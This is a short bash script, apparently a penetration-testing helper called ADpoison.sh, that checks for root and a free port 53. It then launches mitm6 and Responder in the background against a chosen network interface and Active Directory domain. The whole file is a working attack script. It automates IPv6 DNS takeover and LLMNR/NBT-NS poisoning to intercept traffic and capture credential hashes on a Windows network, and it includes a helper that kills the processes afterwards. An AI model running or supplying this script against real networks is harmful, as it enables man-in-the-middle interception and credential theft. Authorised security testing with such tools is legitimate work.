#!/bin/bash

# Function to display usage
usage() {
    echo -e "\nSyntax: ADpoison.sh <interface> <domain>"
    echo "Example: ./ADpoison.sh eth0 domain.local\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Validate input parameters
if [ $# -ne 2 ]; then
    usage
    exit 1
fi

INTERFACE="$1"
DOMAIN="$2"

# Validate the interface
if ! ip link show "$INTERFACE" > /dev/null 2>&1; then
    echo "Error: Interface $INTERFACE not found."
    exit 1
fi

# Check if port 53 is in use
if ss -tuln | grep ':53 ' >/dev/null; then
    echo "Error: Port 53 is already in use."
    exit 1
fi

log_file="mitm_${DOMAIN}.log"

# Starting MiTM6
echo "Starting MiTM6 on domain: $DOMAIN"
nohup python /home/e/mitm6/mitm6/mitm6.py -i "$INTERFACE" -d "$DOMAIN" -l "$DOMAIN" > "/tmp/${log_file}" 2>&1 &
MITM6_PID=$!

# Starting Responder
echo "Starting Responder on interface: $INTERFACE"
nohup responder -I "$INTERFACE" -w -r -d > "/tmp/responder_${INTERFACE}.log" 2>&1 &
RESPONDER_PID=$!

echo "MiTM6 and Responder have been started. PIDs: $MITM6_PID, $RESPONDER_PID."

# Function to kill the started services
kill_services() {
    echo "Terminating MiTM6 (PID: $MITM6_PID) and Responder (PID: $RESPONDER_PID)..."
    kill $MITM6_PID
    kill $RESPONDER_PID

    # Kill any Python service running on port 53
    PYTHON_PID=$(lsof -t -i :53 -sTCP:LISTEN | grep "$(which python)")
    if [ ! -z "$PYTHON_PID" ]; then
        echo "Terminating Python service on port 53 (PID: $PYTHON_PID)..."
        kill "$PYTHON_PID"
    fi

    echo "Services terminated."
}

# Uncomment the line below to enable automatic termination of the services
# trap kill_services EXIT

# Note: You can also call kill_services manually when needed
